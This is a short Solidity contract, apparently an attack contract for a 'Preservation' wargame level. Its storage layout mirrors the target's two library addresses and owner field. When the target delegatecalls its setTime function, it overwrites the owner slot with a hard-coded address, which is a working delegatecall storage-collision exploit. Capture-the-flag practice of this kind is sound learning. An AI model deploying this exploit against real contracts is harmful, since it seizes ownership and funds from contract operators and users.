// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// import "./Preservation.sol";

contract Test {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    constructor() public {
        timeZone1Library = 0x21fbaeE432a4C99837c086A10b525344FB80331B;
        timeZone2Library = 0x21fbaeE432a4C99837c086A10b525344FB80331B;
    }

    function setTime(uint256 _time) public {
        owner = 0xB70B5095274a6255890624e026a9C0e5c950f7C3;
    }
}
